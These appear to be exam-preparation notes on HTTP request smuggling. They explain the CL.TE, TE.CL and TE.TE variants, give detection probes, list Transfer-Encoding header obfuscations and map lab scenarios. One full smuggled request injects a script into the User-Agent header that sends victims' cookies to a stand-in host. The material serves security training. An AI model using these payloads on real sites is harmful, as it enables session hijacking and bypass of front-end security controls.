## Stage 1 + 2
### What is it?
HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests. Request smuggling is primarily associated with HTTP/1 requests. Involves the `Content-Length` and `Transfer-Encoding` headers.
- CL.TE: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
- TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
- TE.TE: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.
> This is mainly only possible on HTTP/1.1 -- there are other ways to exploit HTTP/2
![465](HTTP%20Request%20Smuggling-20251103204354061.png)
### Impact
- Bypassing frontend security controls
	- Example: Admin portal is blocked, HTTP Request Smuggling could bypass it
### Main Goal
Retrieve victim's session id.
![628](HTTP%20Request%20Smuggling-20260201091751877.png)
![413](HTTP%20Request%20Smuggling-20260201204128510.png)

Learn how to use HTTP Request Smuggler BApp extension to automate the process instead of testing it manually (like all the videos show). [Quick video on how to use it](https://www.youtube.com/watch?v=BF8rQezulzg).

### HRS vulns on the exam
**TE.CL with a quote bypass** — One documented variant uses `Transfer-Encoding: "chunked"` (with quotes to obfuscate it from the front-end), combined with a smuggled request that injects an XSS payload into the `User-Agent` header of a comment or search endpoint to steal a victim's cookie. [PyUs3r Blog](https://py-us3r.github.io/bscp-roadmap-bscproadmap/)

**CL.TE with a duplicate Transfer-Encoding** — Another variant uses two `Transfer-Encoding` headers (one obfuscated, e.g. `Transfer-Encoding: ORHFSuL`) alongside a `Content-Length`, then smuggles a `GET` request with an XSS payload in the `User-Agent`. [PyUs3r Blog](https://py-us3r.github.io/bscp-roadmap-bscproadmap/)


### Payloads
^osmqx6
Ensure it is a `POST` request + HTTP/1.1
```
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X


```

TE.CL payload
```
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

HTTP/2 Payload
```
Transfer-Encoding: chunked

0

GET /doesntExist HTTP/1.1
X-Ignore: x
```

### Identify Vulnerabilities in Exam
- Use HTTP Request Smuggler > Smuggle probe or HTTP/2 Probe

#### Automated
Possible HTTP Request Smuggling: CL.TE multiCase (delayed response)
![README - skipped-20260222154439108](README%20-%20skipped-20260222154439108.png)
- `UserAgent` reflected in response
	- **COOKIE STEALER**: [CL](CL.md#1.7.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS%20%E2%AD%95%EF%B8%8F)
- [CL](CL.md#1.1.%20Lab%20HTTP%20request%20smuggling%2C%20confirming%20a%20CL.TE%20vulnerability%20via%20differential%20responses%20%E2%AD%95%EF%B8%8F)
- HTTP Request Smuggling Confirmed: G-multiCase
	- [CL](CL.md#1.x.%20Lab%20HTTP%20request%20smuggling%2C%20basic%20CL.TE%20vulnerability%20%E2%AD%95%EF%B8%8F)

Possible HTTP Request Smuggling: CL.TE options （delayed response）
- **Bypass Admin (Stage 2)** [CL](CL.md#1.3.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20CL.TE%20vulnerability%20%E2%AD%95%EF%B8%8F)
- **Cookie stealer** [Others](Others.md#1.6.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users%27%20requests%20%E2%AD%95%EF%B8%8F)

Possible HTTP Request Smuggling: TE.CL multiCase （delayed response）
- [TE](TE.md#1.2.%20Lab%20HTTP%20request%20smuggling%2C%20confirming%20a%20TE.CL%20vulnerability%20via%20differential%20responses%20%E2%AD%95%EF%B8%8F)
- [TE](TE.md#1.x.%20Lab%20HTTP%20request%20smuggling%2C%20basic%20TE.CL%20vulnerability%20%E2%AD%95%EF%B8%8F)
- **Bypass Admin (Stage 2)** [TE](TE.md#1.4.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20TE.CL%20vulnerability%20%E2%AD%95%EF%B8%8F)

HTTP/2 Probe
HTTP/2 TE desync v10a options
- **Cookie stealer** [HTTP2](HTTP2.md#1.8.%20Lab%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling%20%E2%AD%95%EF%B8%8F)
- **Cookie stealer** [HTTP2](HTTP2.md#1.10.%20Lab%20HTTP%2F2%20request%20smuggling%20via%20CRLF%20injection%20%E2%AD%95%EF%B8%8F)


**THIS DOESN'T WORK. User-Agent isn't reflected in response**
![README-20260222171408585](README-20260222171408585.png)
Possible HTTP Request Smuggling: CL.TE revdualchunk （delayed response)
- **Cookie stealer**  [Others](Others.md#1.x.%20Lab%20HTTP%20request%20smuggling%2C%20obfuscating%20the%20TE%20header%20%E2%AD%95%EF%B8%8F)
Lab used `Transfer-encoding: identity` to solve. In the exam, try the rest.
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

Transfer-encoding: identity
Transfer-encoding: cow
```

```
POST / HTTP/1.1
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: identity

e6
GET /post?postId=4 HTTP/1.1
User-Agent: a"/><script>document.location='http://OASTIFY.COM/?c='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0\r\n  
\r\n
  
```


#### Manual
500 Internal Server Error
- "Server Error: Communication timed out"
	- `User-Agent` reflected in response in `GET /post?postId=`
		- **COOKIE STEALER** [CL](CL.md#1.7.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS%20%E2%AD%95%EF%B8%8F)
	- [CL](CL.md#1.1.%20Lab%20HTTP%20request%20smuggling%2C%20confirming%20a%20CL.TE%20vulnerability%20via%20differential%20responses%20%E2%AD%95%EF%B8%8F)
	- [CL](CL.md#1.3.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20CL.TE%20vulnerability%20%E2%AD%95%EF%B8%8F)
	- [Others](Others.md#1.5.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting%20%E2%AD%95%EF%B8%8F)
	- [CL](CL.md#1.x.%20Lab%20HTTP%20request%20smuggling%2C%20basic%20CL.TE%20vulnerability%20%E2%AD%95%EF%B8%8F)

- [Others](Others.md#1.6.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users%27%20requests%20%E2%AD%95%EF%B8%8F)


400 Bad Request
- "Invalid request"
	- Using TE.CL payload == 500 "Communication timed out"
		- [TE](TE.md#1.2.%20Lab%20HTTP%20request%20smuggling%2C%20confirming%20a%20TE.CL%20vulnerability%20via%20differential%20responses%20%E2%AD%95%EF%B8%8F)
		- [TE](TE.md#1.x.%20Lab%20HTTP%20request%20smuggling%2C%20basic%20TE.CL%20vulnerability%20%E2%AD%95%EF%B8%8F)
- [Others](Others.md#1.x.%20Lab%20CL.0%20request%20smuggling%20%E2%AD%95%EF%B8%8F)


- [Others](Others.md#1.x.%20Lab%20CL.0%20request%20smuggling%20%E2%AD%95%EF%B8%8F)
- [TE](TE.md#1.4.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20TE.CL%20vulnerability%20%E2%AD%95%EF%B8%8F)
- [HTTP2](HTTP2.md#1.8.%20Lab%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling%20%E2%AD%95%EF%B8%8F)
- [HTTP2](HTTP2.md#1.11.%20Lab%20HTTP%2F2%20request%20splitting%20via%20CRLF%20injection%20%E2%AD%95%EF%B8%8F)
- [HTTP2](HTTP2.md#1.10.%20Lab%20HTTP%2F2%20request%20smuggling%20via%20CRLF%20injection%20%E2%AD%95%EF%B8%8F)
- "Both chunked encoding and content-length were specified"
	- [HTTP2](HTTP2.md#1.9.%20Lab%20H2.CL%20request%20smuggling%20%E2%AD%95%EF%B8%8F)

